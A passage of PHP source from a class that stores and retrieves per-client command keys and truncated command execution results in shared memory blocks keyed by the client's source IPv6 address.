            $_shmid        = Class_Base_Memory::open_share_memory ( $_src_ipv6_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1024 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
            if ( $_shmid === false ) {
                return false;
            }
            $_shmid_data        = Class_Base_Memory::read_share_memory ( $_shmid , 0 , 18 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
            $_shmid_command_key = Class_Base_Format::data_to_string ( $_shmid_data );
            $_shmid_command_key = intval ( $_shmid_command_key );
            if ( $_command_key == $_shmid_command_key ) {
                return true;
            }
        }
        return false;
    }

    public static function get_source_ipv6_command_key ( $src_ipv6 )
    {
        $_source_ipv6_key         = self::get_source_shmid_key ( $src_ipv6 );
        $_source_ipv6_key         = substr ( $_source_ipv6_key , 2 , 16 );
        $_source_ipv6_key_integer = intval ( $_source_ipv6_key );
        $_source_ipv6_key_integer = ( Interface_Base_BlockKey::WEB_COMMAND | $_source_ipv6_key_integer );
        return $_source_ipv6_key_integer;
    }

    public static function read_source_ipv6_command_content ( $src_ipv6 )
    {
        $_src_ipv6_key = self::get_source_ipv6_command_key ( $src_ipv6 );
        $_shmid        = Class_Base_Memory::open_share_memory ( $_src_ipv6_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1024 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
        if ( $_shmid === false ) {
            return false;
        }
        $_shmid_data = Class_Base_Memory::read_share_memory ( $_shmid , ( 18 + 4 ) , ( 1024 - ( 18 + 4 ) ) , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( $_shmid_data === false ) {
            return false;
        }
        $_shmid_command_execute_result = Class_Base_Format::data_to_string ( $_shmid_data );
        return $_shmid_command_execute_result;
    }

    public static function write_source_ipv6_command_content ( $src_ipv6 , $command , $command_execute_result )
    {
        $_separator                     = "\r\n\r\n";
        $_src_ipv6_key                  = self::get_source_ipv6_command_key ( $src_ipv6 );
        $_command_key                   = self::get_command_share_memory_key ( $command );
        $_command_execute_result_length = strlen ( $command_execute_result );
        if ( $_command_execute_result_length > 984 ) {
            $command_execute_result = ( substr ( $command_execute_result , 0 , ( 984 - 6 ) ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) );
        }
        $_content = ( $_command_key . $_separator . $command_execute_result );
        $_shmid   = Class_Base_Memory::open_share_memory ( $_src_ipv6_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1024 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
        if ( $_shmid === false ) {
            return false;
        }
        $_write_length = Class_Base_Memory::write_share_memory ( $_shmid , Class_Base_Format::string_to_data ( "\0" , Class_Base_Memory::BLOCK_SIZE_1024 ) , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        if ( $_write_length === false ) {
            return false;
        }
        $_write_length = Class_Base_Memory::write_share_memory ( $_shmid , $_content , 0 , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        return $_write_length;
    }
}